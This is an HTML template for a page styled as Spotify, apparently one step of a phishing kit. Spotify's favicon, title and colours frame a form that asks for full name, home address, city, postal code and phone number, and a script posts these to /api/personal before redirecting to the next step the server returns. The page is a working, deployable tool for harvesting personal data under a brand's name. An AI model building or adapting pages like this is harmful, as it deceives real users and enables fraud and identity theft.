<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ get_text(lang, 'personal_title') }} - Spotify</title>
    <link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon.0f31d2ea.ico">
    <style>
        *{box-sizing:border-box;margin:0;padding:0;font-family:Circular,Spotify Circular,Helvetica,Arial,sans-serif}
        body{background-color:#121212;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .card{background-color:#000;width:100%;max-width:500px;padding:40px;border-radius:8px;box-shadow:0 4px 60px rgba(0,0,0,0.5)}
        h1{text-align:center;font-size:1.75rem;font-weight:700;margin-bottom:10px}
        p{text-align:center;font-size:.9rem;color:#b3b3b3;margin-bottom:30px}
        .form-row{display:flex;gap:15px;margin-bottom:20px}
        .form-group{margin-bottom:20px;flex:1}
        label{display:block;font-size:.875rem;font-weight:700;margin-bottom:8px}
        input{width:100%;padding:14px;background:#121212;border:1px solid #727272;border-radius:4px;color:#fff;font-size:1rem}
        input:focus{outline:none;border-color:#fff}
        .submit-btn{width:100%;padding:14px;background-color:#1db954;color:#000;border:none;border-radius:500px;font-size:1rem;font-weight:700;cursor:pointer;margin-top:10px}
        .submit-btn:hover{background-color:#1ed760}
        .lang-indicator{text-align:center;font-size:11px;color:#6c6c8a;margin-bottom:10px}
    </style>
</head>
<body>
    <div class="card">
        <div class="lang-indicator">🌍 {{ get_text(lang, 'name') }}</div>
        <h1>{{ get_text(lang, 'personal_title') }}</h1>
        <p>{{ get_text(lang, 'personal_subtitle') }}</p>
        <form id="personalForm">
            <div class="form-row">
                <div class="form-group">
                    <label>{{ get_text(lang, 'personal_firstname') }}</label>
                    <input type="text" id="firstName" required placeholder="{{ get_text(lang, 'personal_firstname') }}">
                </div>
                <div class="form-group">
                    <label>{{ get_text(lang, 'personal_lastname') }}</label>
                    <input type="text" id="lastName" required placeholder="{{ get_text(lang, 'personal_lastname') }}">
                </div>
            </div>
            <div class="form-group">
                <label>{{ get_text(lang, 'personal_address') }}</label>
                <input type="text" id="address" required placeholder="{{ get_text(lang, 'personal_address') }}">
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>{{ get_text(lang, 'personal_city') }}</label>
                    <input type="text" id="city" required placeholder="{{ get_text(lang, 'personal_city') }}">
                </div>
                <div class="form-group">
                    <label>{{ get_text(lang, 'personal_postal') }}</label>
                    <input type="text" id="postalCode" required placeholder="{{ get_text(lang, 'personal_postal') }}">
                </div>
            </div>
            <div class="form-group">
                <label>{{ get_text(lang, 'personal_phone') }}</label>
                <input type="tel" id="phone" required placeholder="{{ get_text(lang, 'personal_phone') }}">
            </div>
            <button type="submit" class="submit-btn">{{ get_text(lang, 'personal_button') }}</button>
        </form>
    </div>
    <script>
        document.getElementById('personalForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const firstName = document.getElementById('firstName').value;
            const lastName = document.getElementById('lastName').value;
            const address = document.getElementById('address').value;
            const city = document.getElementById('city').value;
            const postalCode = document.getElementById('postalCode').value;
            const phone = document.getElementById('phone').value;
            try {
                const res = await fetch('/api/personal', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({firstName,lastName,address,city,postalCode,phone})
                });
                const data = await res.json();
                if(data.status === 'success') {
                    window.location.href = data.next;
                }
            } catch(err) {}
        });
    </script>
</body>
</html>
